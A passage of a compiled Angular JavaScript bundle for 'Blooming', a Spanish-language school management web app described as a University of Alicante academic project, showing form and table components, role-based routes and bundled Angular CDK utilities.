        \u0275\u0275text(15, "Nombre");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(16, "th", 8);
        \u0275\u0275text(17, "Usuario");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(18, "th", 8);
        \u0275\u0275text(19, "Fecha de nacimiento");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(20, "th", 8);
        \u0275\u0275text(21, "Clase");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(22, "th", 8);
        \u0275\u0275text(23, "Centro");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(24, "th", 8);
        \u0275\u0275text(25, "Estado Emocional");
        \u0275\u0275elementEnd();
        \u0275\u0275element(26, "th", 8);
        \u0275\u0275elementEnd()();
        \u0275\u0275elementStart(27, "tbody")(28, "tr")(29, "td", 8);
        \u0275\u0275text(30, "Pepe");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(31, "td", 8);
        \u0275\u0275text(32, "Pepe1");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(33, "td", 8);
        \u0275\u0275text(34, "24/10/2015");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(35, "td", 8);
        \u0275\u0275text(36, "1\xBAA");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(37, "td", 8);
        \u0275\u0275text(38, "Cole1");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(39, "td", 8)(40, "div", 9)(41, "span", 10);
        \u0275\u0275text(42, "Bueno");
        \u0275\u0275elementEnd()()();
        \u0275\u0275elementStart(43, "td", 8)(44, "a", 11);
        \u0275\u0275text(45, "Ver Perfil");
        \u0275\u0275elementEnd()()()()()()();
        \u0275\u0275elementStart(46, "a", 12);
        \u0275\u0275text(47, "Volver");
        \u0275\u0275elementEnd()()()()();
        \u0275\u0275element(48, "br")(49, "br");
        \u0275\u0275elementStart(50, "div", 13)(51, "p", 14);
        \u0275\u0275text(52, "\xA9 2023 Blooming. Proyecto acad\xE9mico de la Universidad de Alicante .");
        \u0275\u0275elementEnd()()()()();
      }
    },
    styles: ["\n\n/*# sourceMappingURL=data:application/json;base64,ewogICJ2ZXJzaW9uIjogMywKICAic291cmNlcyI6IFtdLAogICJzb3VyY2VzQ29udGVudCI6IFtdLAogICJtYXBwaW5ncyI6ICIiLAogICJuYW1lcyI6IFtdCn0K */"]
  });
  let VerAlumnosPComponent2 = _VerAlumnosPComponent;
  return VerAlumnosPComponent2;
})();

// src/app/pages/centros/editar-alumnos-c/editar-alumnos-c.component.ts
var EditarAlumnosCComponent = /* @__PURE__ */ (() => {
  const _EditarAlumnosCComponent = class _EditarAlumnosCComponent {
  };
  _EditarAlumnosCComponent.\u0275fac = function EditarAlumnosCComponent_Factory(t) {
    return new (t || _EditarAlumnosCComponent)();
  };
  _EditarAlumnosCComponent.\u0275cmp = /* @__PURE__ */ \u0275\u0275defineComponent({
    type: _EditarAlumnosCComponent,
    selectors: [["app-editar-alumnos-c"]],
    decls: 43,
    vars: 0,
    consts: [["id", "main-wrapper", "data-layout", "vertical", "data-navbarbg", "skin6", "data-sidebartype", "full", "data-sidebar-position", "fixed", "data-header-position", "fixed", 1, "page-wrapper"], [1, "body-wrapper", 2, "margin-left", "0"], [1, "container-fluid"], [1, "card"], [1, "card-body"], [1, "card-title", "fw-semibold", "mb-4"], [1, "mb-3"], ["for", "exampleInputEmail1", 1, "form-label"], ["type", "email", "id", "exampleInputEmail1", "aria-describedby", "emailHelp", 1, "form-control"], ["for", "exampleInputPassword1", 1, "form-label"], ["type", "password", "id", "exampleInputPassword1", 1, "form-control"], ["type", "submit", 1, "btn", "btn-secondary"], ["routerLink", "/centros/ver-alumnos", 1, "btn", "btn-secondary"], [1, "py-6", "px-6", "text-center"], [1, "copyright"]],
    template: function EditarAlumnosCComponent_Template(rf, ctx) {
      if (rf & 1) {
        \u0275\u0275elementStart(0, "div", 0)(1, "div", 1)(2, "div", 2)(3, "div", 2)(4, "div", 2)(5, "div", 3)(6, "div", 4)(7, "h5", 5);
        \u0275\u0275text(8, "Editar Alumno");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(9, "div", 3)(10, "div", 4)(11, "form")(12, "div", 6)(13, "label", 7);
        \u0275\u0275text(14, "Nombre");
        \u0275\u0275elementEnd();
        \u0275\u0275element(15, "input", 8);
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(16, "div", 6)(17, "label", 7);
        \u0275\u0275text(18, "Apellidos");
        \u0275\u0275elementEnd();
        \u0275\u0275element(19, "input", 8);
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(20, "div", 6)(21, "label", 9);
        \u0275\u0275text(22, "Usuario");
        \u0275\u0275elementEnd();
        \u0275\u0275element(23, "input", 10);
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(24, "div", 6)(25, "label", 9);
        \u0275\u0275text(26, "Fecha de Nacimiento");
        \u0275\u0275elementEnd();
        \u0275\u0275element(27, "input", 10);
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(28, "div", 6)(29, "label", 9);
        \u0275\u0275text(30, "Clase");
        \u0275\u0275elementEnd();
        \u0275\u0275element(31, "input", 10);
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(32, "div", 6)(33, "label", 9);
        \u0275\u0275text(34, "Centro");
        \u0275\u0275elementEnd();
        \u0275\u0275element(35, "input", 10);
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(36, "button", 11);
        \u0275\u0275text(37, "Aceptar");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(38, "a", 12);
        \u0275\u0275text(39, "Volver");
        \u0275\u0275elementEnd()()()()()()()();
        \u0275\u0275elementStart(40, "div", 13)(41, "p", 14);
        \u0275\u0275text(42, "\xA9 2023 Blooming. Proyecto acad\xE9mico de la Universidad de Alicante .");
        \u0275\u0275elementEnd()()()()();
      }
    },
    dependencies: [RouterLink, \u0275NgNoValidate, NgControlStatusGroup, NgForm],
    styles: ["\n\n.btn-secondary[_ngcontent-%COMP%] {\n  margin-left: 10px;\n}\n/*# sourceMappingURL=data:application/json;base64,ewogICJ2ZXJzaW9uIjogMywKICAic291cmNlcyI6IFsic3JjL2FwcC9wYWdlcy9jZW50cm9zL2VkaXRhci1hbHVtbm9zLWMvZWRpdGFyLWFsdW1ub3MtYy5jb21wb25lbnQuY3NzIl0sCiAgInNvdXJjZXNDb250ZW50IjogWyIuYnRuLXNlY29uZGFyeSB7XHJcbiAgICBtYXJnaW4tbGVmdDogMTBweDtcclxufSJdLAogICJtYXBwaW5ncyI6ICI7QUFBQSxDQUFDO0FBQ0csZUFBYTtBQUNqQjsiLAogICJuYW1lcyI6IFtdCn0K */"]
  });
  let EditarAlumnosCComponent2 = _EditarAlumnosCComponent;
  return EditarAlumnosCComponent2;
})();

// src/app/pages/centros/editar-profesores-c/editar-profesores-c.component.ts
var EditarProfesoresCComponent = /* @__PURE__ */ (() => {
  const _EditarProfesoresCComponent = class _EditarProfesoresCComponent {
  };
  _EditarProfesoresCComponent.\u0275fac = function EditarProfesoresCComponent_Factory(t) {
    return new (t || _EditarProfesoresCComponent)();
  };
  _EditarProfesoresCComponent.\u0275cmp = /* @__PURE__ */ \u0275\u0275defineComponent({
    type: _EditarProfesoresCComponent,
    selectors: [["app-editar-profesores-c"]],
    decls: 35,
    vars: 0,
    consts: [["id", "main-wrapper", "data-layout", "vertical", "data-navbarbg", "skin6", "data-sidebartype", "full", "data-sidebar-position", "fixed", "data-header-position", "fixed", 1, "page-wrapper"], [1, "body-wrapper", 2, "margin-left", "0"], [1, "container-fluid"], [1, "card"], [1, "card-body"], [1, "card-title", "fw-semibold", "mb-4"], [1, "mb-3"], ["for", "exampleInputEmail1", 1, "form-label"], ["type", "email", "id", "exampleInputEmail1", "aria-describedby", "emailHelp", 1, "form-control"], ["for", "exampleInputPassword1", 1, "form-label"], ["type", "password", "id", "exampleInputPassword1", 1, "form-control"], ["type", "submit", 1, "btn", "btn-secondary"], ["routerLink", "/centros/ver-profesores", 1, "btn", "btn-secondary"], [1, "py-6", "px-6", "text-center"], [1, "copyright"]],
    template: function EditarProfesoresCComponent_Template(rf, ctx) {
      if (rf & 1) {
        \u0275\u0275elementStart(0, "div", 0)(1, "div", 1)(2, "div", 2)(3, "div", 2)(4, "div", 2)(5, "div", 3)(6, "div", 4)(7, "h5", 5);
        \u0275\u0275text(8, "Editar Profesor");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(9, "div", 3)(10, "div", 4)(11, "form")(12, "div", 6)(13, "label", 7);
        \u0275\u0275text(14, "Nombre");
        \u0275\u0275elementEnd();
        \u0275\u0275element(15, "input", 8);
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(16, "div", 6)(17, "label", 7);
        \u0275\u0275text(18, "Email");
        \u0275\u0275elementEnd();
        \u0275\u0275element(19, "input", 8);
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(20, "div", 6)(21, "label", 9);
        \u0275\u0275text(22, "Centro");
        \u0275\u0275elementEnd();
        \u0275\u0275element(23, "input", 10);
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(24, "div", 6)(25, "label", 9);
        \u0275\u0275text(26, "Clase");
        \u0275\u0275elementEnd();
        \u0275\u0275element(27, "input", 10);
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(28, "button", 11);
        \u0275\u0275text(29, "Aceptar");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(30, "a", 12);
        \u0275\u0275text(31, "Volver");
        \u0275\u0275elementEnd()()()()()()()();
        \u0275\u0275elementStart(32, "div", 13)(33, "p", 14);
        \u0275\u0275text(34, "\xA9 2023 Blooming. Proyecto acad\xE9mico de la Universidad de Alicante .");
        \u0275\u0275elementEnd()()()()();
      }
    },
    dependencies: [RouterLink, \u0275NgNoValidate, NgControlStatusGroup, NgForm],
    styles: ["\n\n.btn-secondary[_ngcontent-%COMP%] {\n  margin-left: 10px;\n}\n/*# sourceMappingURL=data:application/json;base64,ewogICJ2ZXJzaW9uIjogMywKICAic291cmNlcyI6IFsic3JjL2FwcC9wYWdlcy9jZW50cm9zL2VkaXRhci1wcm9mZXNvcmVzLWMvZWRpdGFyLXByb2Zlc29yZXMtYy5jb21wb25lbnQuY3NzIl0sCiAgInNvdXJjZXNDb250ZW50IjogWyIuYnRuLXNlY29uZGFyeSB7XHJcbiAgICBtYXJnaW4tbGVmdDogMTBweDtcclxufSJdLAogICJtYXBwaW5ncyI6ICI7QUFBQSxDQUFDO0FBQ0csZUFBYTtBQUNqQjsiLAogICJuYW1lcyI6IFtdCn0K */"]
  });
  let EditarProfesoresCComponent2 = _EditarProfesoresCComponent;
  return EditarProfesoresCComponent2;
})();

// src/app/pages/centros/editar-clases-c/editar-clases-c.component.ts
var EditarClasesCComponent = /* @__PURE__ */ (() => {
  const _EditarClasesCComponent = class _EditarClasesCComponent {
  };
  _EditarClasesCComponent.\u0275fac = function EditarClasesCComponent_Factory(t) {
    return new (t || _EditarClasesCComponent)();
  };
  _EditarClasesCComponent.\u0275cmp = /* @__PURE__ */ \u0275\u0275defineComponent({
    type: _EditarClasesCComponent,
    selectors: [["app-editar-clases-c"]],
    decls: 31,
    vars: 0,
    consts: [["id", "main-wrapper", "data-layout", "vertical", "data-navbarbg", "skin6", "data-sidebartype", "full", "data-sidebar-position", "fixed", "data-header-position", "fixed", 1, "page-wrapper"], [1, "body-wrapper", 2, "margin-left", "0"], [1, "container-fluid"], [1, "card"], [1, "card-body"], [1, "card-title", "fw-semibold", "mb-4"], [1, "mb-3"], ["for", "exampleInputEmail1", 1, "form-label"], ["type", "email", "id", "exampleInputEmail1", "aria-describedby", "emailHelp", 1, "form-control"], ["for", "exampleInputPassword1", 1, "form-label"], ["type", "password", "id", "exampleInputPassword1", 1, "form-control"], ["type", "submit", 1, "btn", "btn-secondary"], ["routerLink", "/centros/ver-clases", 1, "btn", "btn-secondary"], [1, "py-6", "px-6", "text-center"], [1, "copyright"]],
    template: function EditarClasesCComponent_Template(rf, ctx) {
      if (rf & 1) {
        \u0275\u0275elementStart(0, "div", 0)(1, "div", 1)(2, "div", 2)(3, "div", 2)(4, "div", 2)(5, "div", 3)(6, "div", 4)(7, "h5", 5);
        \u0275\u0275text(8, "Editar Clase");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(9, "div", 3)(10, "div", 4)(11, "form")(12, "div", 6)(13, "label", 7);
        \u0275\u0275text(14, "Nombre");
        \u0275\u0275elementEnd();
        \u0275\u0275element(15, "input", 8);
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(16, "div", 6)(17, "label", 7);
        \u0275\u0275text(18, "Centro");
        \u0275\u0275elementEnd();
        \u0275\u0275element(19, "input", 8);
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(20, "div", 6)(21, "label", 9);
        \u0275\u0275text(22, "N\xBA Alumnos");
        \u0275\u0275elementEnd();
        \u0275\u0275element(23, "input", 10);
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(24, "button", 11);
        \u0275\u0275text(25, "Aceptar");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(26, "a", 12);
        \u0275\u0275text(27, "Volver");
        \u0275\u0275elementEnd()()()()()()()();
        \u0275\u0275elementStart(28, "div", 13)(29, "p", 14);
        \u0275\u0275text(30, "\xA9 2023 Blooming. Proyecto acad\xE9mico de la Universidad de Alicante .");
        \u0275\u0275elementEnd()()()()();
      }
    },
    dependencies: [RouterLink, \u0275NgNoValidate, NgControlStatusGroup, NgForm],
    styles: ["\n\n.btn-secondary[_ngcontent-%COMP%] {\n  margin-left: 10px;\n}\n/*# sourceMappingURL=data:application/json;base64,ewogICJ2ZXJzaW9uIjogMywKICAic291cmNlcyI6IFsic3JjL2FwcC9wYWdlcy9jZW50cm9zL2VkaXRhci1jbGFzZXMtYy9lZGl0YXItY2xhc2VzLWMuY29tcG9uZW50LmNzcyJdLAogICJzb3VyY2VzQ29udGVudCI6IFsiLmJ0bi1zZWNvbmRhcnkge1xyXG4gICAgbWFyZ2luLWxlZnQ6IDEwcHg7XHJcbn0iXSwKICAibWFwcGluZ3MiOiAiO0FBQUEsQ0FBQztBQUNHLGVBQWE7QUFDakI7IiwKICAibmFtZXMiOiBbXQp9Cg== */"]
  });
  let EditarClasesCComponent2 = _EditarClasesCComponent;
  return EditarClasesCComponent2;
})();

// src/app/layouts/alumno-layout/alumno-layout.component.ts
var AlumnoLayoutComponent = /* @__PURE__ */ (() => {
  const _AlumnoLayoutComponent = class _AlumnoLayoutComponent {
  };
  _AlumnoLayoutComponent.\u0275fac = function AlumnoLayoutComponent_Factory(t) {
    return new (t || _AlumnoLayoutComponent)();
  };
  _AlumnoLayoutComponent.\u0275cmp = /* @__PURE__ */ \u0275\u0275defineComponent({
    type: _AlumnoLayoutComponent,
    selectors: [["app-alumno-layout"]],
    decls: 2,
    vars: 0,
    consts: [["id", "main-wrapper", "data-layout", "vertical", "data-navbarbg", "skin6", "data-sidebartype", "full", "data-sidebar-position", "fixed", "data-header-position", "fixed", 1, "page-wrapper"]],
    template: function AlumnoLayoutComponent_Template(rf, ctx) {
      if (rf & 1) {
        \u0275\u0275elementStart(0, "div", 0);
        \u0275\u0275element(1, "router-outlet");
        \u0275\u0275elementEnd();
      }
    },
    dependencies: [RouterOutlet],
    styles: ["\n\n/*# sourceMappingURL=data:application/json;base64,ewogICJ2ZXJzaW9uIjogMywKICAic291cmNlcyI6IFtdLAogICJzb3VyY2VzQ29udGVudCI6IFtdLAogICJtYXBwaW5ncyI6ICIiLAogICJuYW1lcyI6IFtdCn0K */"]
  });
  let AlumnoLayoutComponent2 = _AlumnoLayoutComponent;
  return AlumnoLayoutComponent2;
})();

// src/app/pages/alumnos/alumnos.component.ts
var AlumnosComponent = /* @__PURE__ */ (() => {
  const _AlumnosComponent = class _AlumnosComponent {
  };
  _AlumnosComponent.\u0275fac = function AlumnosComponent_Factory(t) {
    return new (t || _AlumnosComponent)();
  };
  _AlumnosComponent.\u0275cmp = /* @__PURE__ */ \u0275\u0275defineComponent({
    type: _AlumnosComponent,
    selectors: [["app-alumnos"]],
    decls: 5,
    vars: 0,
    consts: [[1, "container"], [1, "btn", "btn-success", "comenzar-btn"]],
    template: function AlumnosComponent_Template(rf, ctx) {
      if (rf & 1) {
        \u0275\u0275elementStart(0, "div", 0)(1, "h1");
        \u0275\u0275text(2, "\xA1Bienvenido de nuevo a Blooming!");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(3, "button", 1);
        \u0275\u0275text(4, "Comenzar");
        \u0275\u0275elementEnd()();
      }
    },
    styles: ["\n\n.container[_ngcontent-%COMP%] {\n  display: flex;\n  flex-direction: column;\n  align-items: center;\n  justify-content: center;\n  height: 90vh;\n  background-color: #f4f4f4;\n  border-radius: 10px;\n  margin-top: 50px;\n  margin-bottom: 50px;\n}\nh1[_ngcontent-%COMP%] {\n  color: #3498db;\n}\n.comenzar-btn[_ngcontent-%COMP%] {\n  font-size: 16px;\n  padding: 10px 20px;\n  cursor: pointer;\n  border-radius: 5px;\n  margin-top: 20px;\n}\n/*# sourceMappingURL=data:application/json;base64,ewogICJ2ZXJzaW9uIjogMywKICAic291cmNlcyI6IFsic3JjL2FwcC9wYWdlcy9hbHVtbm9zL2FsdW1ub3MuY29tcG9uZW50LmNzcyJdLAogICJzb3VyY2VzQ29udGVudCI6IFsiLmNvbnRhaW5lciB7XHJcbiAgICBkaXNwbGF5OiBmbGV4O1xyXG4gICAgZmxleC1kaXJlY3Rpb246IGNvbHVtbjtcclxuICAgIGFsaWduLWl0ZW1zOiBjZW50ZXI7XHJcbiAgICBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjtcclxuICAgIGhlaWdodDogOTB2aDtcclxuICAgIGJhY2tncm91bmQtY29sb3I6ICNmNGY0ZjQ7XHJcbiAgICBib3JkZXItcmFkaXVzOiAxMHB4O1xyXG4gICAgbWFyZ2luLXRvcDogNTBweDtcclxuICAgIG1hcmdpbi1ib3R0b206IDUwcHg7XHJcbn1cclxuaDEge1xyXG4gICAgY29sb3I6ICMzNDk4ZGI7XHJcbn1cclxuLmNvbWVuemFyLWJ0biB7XHJcbiAgICBcclxuICAgIGZvbnQtc2l6ZTogMTZweDtcclxuICAgIHBhZGRpbmc6IDEwcHggMjBweDtcclxuICAgIGN1cnNvcjogcG9pbnRlcjtcclxuICAgIGJvcmRlci1yYWRpdXM6IDVweDtcclxuICAgIG1hcmdpbi10b3A6IDIwcHg7XHJcbn0iXSwKICAibWFwcGluZ3MiOiAiO0FBQUEsQ0FBQztBQUNHLFdBQVM7QUFDVCxrQkFBZ0I7QUFDaEIsZUFBYTtBQUNiLG1CQUFpQjtBQUNqQixVQUFRO0FBQ1Isb0JBQWtCO0FBQ2xCLGlCQUFlO0FBQ2YsY0FBWTtBQUNaLGlCQUFlO0FBQ25CO0FBQ0E7QUFDSSxTQUFPO0FBQ1g7QUFDQSxDQUFDO0FBRUcsYUFBVztBQUNYLFdBQVMsS0FBSztBQUNkLFVBQVE7QUFDUixpQkFBZTtBQUNmLGNBQVk7QUFDaEI7IiwKICAibmFtZXMiOiBbXQp9Cg== */"]
  });
  let AlumnosComponent2 = _AlumnosComponent;
  return AlumnosComponent2;
})();

// src/app/pages/pages.routing.ts
var routes2 = [
  {
    path: "admin",
    component: AdminLayoutComponent,
    canActivate: [AuthGuard],
    children: [{
      path: "dashboard",
      component: AdmindashboardComponent
    }, {
      path: "ver-alumnos",
      component: VerAlumnosComponent
    }, {
      path: "ver-centros",
      component: VerCentrosComponent
    }, {
      path: "ver-clases",
      component: VerClasesComponent
    }, {
      path: "ver-profesores",
      component: VerProfesoresComponent
    }, {
      path: "crear-alumnos",
      component: CrearAlumnosComponent
    }, {
      path: "crear-centros",
      component: CrearCentrosComponent
    }, {
      path: "crear-clases",
      component: CrearClasesComponent
    }, {
      path: "crear-profesores",
      component: CrearProfesoresComponent
    }, {
      path: "editar-alumnos",
      component: EditarAlumnosComponent
    }, {
      path: "editar-centros",
      component: EditarCentrosComponent
    }, {
      path: "editar-clases",
      component: EditarClasesComponent
    }, {
      path: "editar-profesores",
      component: EditarProfesoresComponent
    }, {
      path: "**",
      redirectTo: "dashboard"
    }]
  },
  {
    path: "centros",
    component: AdminLayoutComponent,
    canActivate: [AuthGuard],
    children: [{
      path: "dashboard",
      component: CentrosComponent
    }, {
      path: "ver-alumnos",
      component: VerAlumnosCComponent
    }, {
      path: "ver-profesores",
      component: VerProfesoresCComponent
    }, {
      path: "ver-clases",
      component: VerClasesCComponent
    }, {
      path: "crear-alumnos",
      component: CrearAlumnosCComponent
    }, {
      path: "crear-profesores",
      component: CrearProfesoresCComponent
    }, {
      path: "crear-clases",
      component: CrearClasesCComponent
    }, {
      path: "editar-alumnos",
      component: EditarAlumnosCComponent
    }, {
      path: "editar-profesores",
      component: EditarProfesoresCComponent
    }, {
      path: "editar-clases",
      component: EditarClasesCComponent
    }]
  },
  {
    path: "profesores",
    component: AdminLayoutComponent,
    canActivate: [AuthGuard],
    children: [{
      path: "dashboard",
      component: ProfesoresComponent
    }, {
      path: "ver-clases",
      component: VerClasesPComponent
    }, {
      path: "ver-perfil-alumno",
      component: VerPerfilAlumnoComponent
    }, {
      path: "actividad-reciente",
      component: ActividadRecienteComponent
    }, {
      path: "ver-alumnos",
      component: VerAlumnosPComponent
    }]
  },
  {
    path: "alumnos",
    component: AlumnoLayoutComponent,
    children: [{
      path: "dashboard",
      component: AlumnosComponent
    }]
  }
  /*{
    path: 'dashboard', component: DashboardComponent,
    children: [
    { path: '', component: DashboardComponent},
    { path: '**', redirectTo: ''}
  ]},*/
  /*{ path: 'usuarios', component: UsuariosComponent}*/
];
var PagesRoutingModule = /* @__PURE__ */ (() => {
  const _PagesRoutingModule = class _PagesRoutingModule {
  };
  _PagesRoutingModule.\u0275fac = function PagesRoutingModule_Factory(t) {
    return new (t || _PagesRoutingModule)();
  };
  _PagesRoutingModule.\u0275mod = /* @__PURE__ */ \u0275\u0275defineNgModule({
    type: _PagesRoutingModule
  });
  _PagesRoutingModule.\u0275inj = /* @__PURE__ */ \u0275\u0275defineInjector({
    imports: [RouterModule.forChild(routes2), RouterModule]
  });
  let PagesRoutingModule2 = _PagesRoutingModule;
  return PagesRoutingModule2;
})();

// node_modules/@angular/cdk/fesm2022/coercion.mjs
function coerceArray(value) {
  return Array.isArray(value) ? value : [value];
}
function coerceElement(elementOrRef) {
  return elementOrRef instanceof ElementRef ? elementOrRef.nativeElement : elementOrRef;
}

// node_modules/@angular/cdk/fesm2022/platform.mjs
var hasV8BreakIterator;
try {
  hasV8BreakIterator = typeof Intl !== "undefined" && Intl.v8BreakIterator;
} catch {
  hasV8BreakIterator = false;
}
var Platform = /* @__PURE__ */ (() => {
  const _Platform = class _Platform {
    constructor(_platformId) {
      this._platformId = _platformId;
      this.isBrowser = this._platformId ? isPlatformBrowser(this._platformId) : typeof document === "object" && !!document;
      this.EDGE = this.isBrowser && /(edge)/i.test(navigator.userAgent);
      this.TRIDENT = this.isBrowser && /(msie|trident)/i.test(navigator.userAgent);
      this.BLINK = this.isBrowser && !!(window.chrome || hasV8BreakIterator) && typeof CSS !== "undefined" && !this.EDGE && !this.TRIDENT;
      this.WEBKIT = this.isBrowser && /AppleWebKit/i.test(navigator.userAgent) && !this.BLINK && !this.EDGE && !this.TRIDENT;
      this.IOS = this.isBrowser && /iPad|iPhone|iPod/.test(navigator.userAgent) && !("MSStream" in window);
      this.FIREFOX = this.isBrowser && /(firefox|minefield)/i.test(navigator.userAgent);
      this.ANDROID = this.isBrowser && /android/i.test(navigator.userAgent) && !this.TRIDENT;
      this.SAFARI = this.isBrowser && /safari/i.test(navigator.userAgent) && this.WEBKIT;
    }
  };
  _Platform.\u0275fac = function Platform_Factory(t) {
    return new (t || _Platform)(\u0275\u0275inject(PLATFORM_ID));
  };
  _Platform.\u0275prov = /* @__PURE__ */ \u0275\u0275defineInjectable({
    token: _Platform,
    factory: _Platform.\u0275fac,
    providedIn: "root"
  });
  let Platform2 = _Platform;
  return Platform2;
})();
var supportsPassiveEvents;
function supportsPassiveEventListeners() {
  if (supportsPassiveEvents == null && typeof window !== "undefined") {
    try {
      window.addEventListener("test", null, Object.defineProperty({}, "passive", {
        get: () => supportsPassiveEvents = true
      }));
    } finally {
      supportsPassiveEvents = supportsPassiveEvents || false;
    }
  }
  return supportsPassiveEvents;
}
function normalizePassiveListenerOptions(options) {
  return supportsPassiveEventListeners() ? options : !!options.capture;
}
function _getEventTarget(event) {
  return event.composedPath ? event.composedPath()[0] : event.target;
}
function _isTestEnvironment() {
  return (
    // @ts-ignore
    typeof __karma__ !== "undefined" && !!__karma__ || // @ts-ignore
    typeof jasmine !== "undefined" && !!jasmine || // @ts-ignore
    typeof jest !== "undefined" && !!jest || // @ts-ignore
    typeof Mocha !== "undefined" && !!Mocha
  );
}

// node_modules/@angular/cdk/fesm2022/bidi.mjs
var BidiModule = /* @__PURE__ */ (() => {
  const _BidiModule = class _BidiModule {
  };
  _BidiModule.\u0275fac = function BidiModule_Factory(t) {
    return new (t || _BidiModule)();
  };
  _BidiModule.\u0275mod = /* @__PURE__ */ \u0275\u0275defineNgModule({
    type: _BidiModule
  });
  _BidiModule.\u0275inj = /* @__PURE__ */ \u0275\u0275defineInjector({});
  let BidiModule2 = _BidiModule;
  return BidiModule2;
})();

// node_modules/@angular/cdk/fesm2022/scrolling.mjs
var CdkScrollableModule = /* @__PURE__ */ (() => {
  const _CdkScrollableModule = class _CdkScrollableModule {
  };
  _CdkScrollableModule.\u0275fac = function CdkScrollableModule_Factory(t) {
    return new (t || _CdkScrollableModule)();
  };
  _CdkScrollableModule.\u0275mod = /* @__PURE__ */ \u0275\u0275defineNgModule({
    type: _CdkScrollableModule
  });
  _CdkScrollableModule.\u0275inj = /* @__PURE__ */ \u0275\u0275defineInjector({});
  let CdkScrollableModule2 = _CdkScrollableModule;
  return CdkScrollableModule2;
})();

// node_modules/@angular/cdk/fesm2022/layout.mjs
var mediaQueriesForWebkitCompatibility = /* @__PURE__ */ new Set();
var mediaQueryStyleNode;
var MediaMatcher = /* @__PURE__ */ (() => {
  const _MediaMatcher = class _MediaMatcher {
    constructor(_platform, _nonce) {
      this._platform = _platform;
      this._nonce = _nonce;
      this._matchMedia = this._platform.isBrowser && window.matchMedia ? (
        // matchMedia is bound to the window scope intentionally as it is an illegal invocation to
        // call it from a different scope.
        window.matchMedia.bind(window)
      ) : noopMatchMedia;
    }
    /**
     * Evaluates the given media query and returns the native MediaQueryList from which results
     * can be retrieved.
     * Confirms the layout engine will trigger for the selector query provided and returns the
     * MediaQueryList for the query provided.
     */
    matchMedia(query) {
      if (this._platform.WEBKIT || this._platform.BLINK) {
        createEmptyStyleRule(query, this._nonce);
      }
      return this._matchMedia(query);
    }
  };
  _MediaMatcher.\u0275fac = function MediaMatcher_Factory(t) {
    return new (t || _MediaMatcher)(\u0275\u0275inject(Platform), \u0275\u0275inject(CSP_NONCE, 8));
  };
  _MediaMatcher.\u0275prov = /* @__PURE__ */ \u0275\u0275defineInjectable({
    token: _MediaMatcher,
    factory: _MediaMatcher.\u0275fac,
    providedIn: "root"
  });
  let MediaMatcher2 = _MediaMatcher;
  return MediaMatcher2;
})();
function createEmptyStyleRule(query, nonce) {
  if (mediaQueriesForWebkitCompatibility.has(query)) {
    return;
  }
  try {
    if (!mediaQueryStyleNode) {
      mediaQueryStyleNode = document.createElement("style");
      if (nonce) {
        mediaQueryStyleNode.nonce = nonce;
      }
      mediaQueryStyleNode.setAttribute("type", "text/css");
      document.head.appendChild(mediaQueryStyleNode);
    }
    if (mediaQueryStyleNode.sheet) {
      mediaQueryStyleNode.sheet.insertRule(`@media ${query} {body{ }}`, 0);
      mediaQueriesForWebkitCompatibility.add(query);
    }
  } catch (e) {
    console.error(e);
  }
}
function noopMatchMedia(query) {
  return {
    matches: query === "all" || query === "",
    media: query,
    addListener: () => {
    },
    removeListener: () => {
    }
  };
}
var BreakpointObserver = /* @__PURE__ */ (() => {
  const _BreakpointObserver = class _BreakpointObserver {
    constructor(_mediaMatcher, _zone) {
      this._mediaMatcher = _mediaMatcher;
      this._zone = _zone;
      this._queries = /* @__PURE__ */ new Map();
      this._destroySubject = new Subject();
    }
    /** Completes the active subject, signalling to all other observables to complete. */
    ngOnDestroy() {
      this._destroySubject.next();
      this._destroySubject.complete();
    }
    /**
     * Whether one or more media queries match the current viewport size.
     * @param value One or more media queries to check.
     * @returns Whether any of the media queries match.
     */
    isMatched(value) {
      const queries = splitQueries(coerceArray(value));
      return queries.some((mediaQuery) => this._registerQuery(mediaQuery).mql.matches);
    }
    /**
     * Gets an observable of results for the given queries that will emit new results for any changes
     * in matching of the given queries.
     * @param value One or more media queries to check.
     * @returns A stream of matches for the given queries.
     */
    observe(value) {
      const queries = splitQueries(coerceArray(value));
      const observables = queries.map((query) => this._registerQuery(query).observable);
      let stateObservable = combineLatest(observables);
      stateObservable = concat(stateObservable.pipe(take(1)), stateObservable.pipe(skip(1), debounceTime(0)));
      return stateObservable.pipe(map((breakpointStates) => {
        const response = {
          matches: false,
          breakpoints: {}
        };
        breakpointStates.forEach(({
          matches,
          query
        }) => {
          response.matches = response.matches || matches;
          response.breakpoints[query] = matches;
        });
        return response;
      }));
    }
    /** Registers a specific query to be listened for. */
    _registerQuery(query) {
      if (this._queries.has(query)) {
        return this._queries.get(query);
      }
      const mql = this._mediaMatcher.matchMedia(query);
      const queryObservable = new Observable((observer) => {
        const handler = (e) => this._zone.run(() => observer.next(e));
        mql.addListener(handler);
        return () => {
          mql.removeListener(handler);
        };
      }).pipe(startWith(mql), map(({
        matches
      }) => ({
        query,
        matches
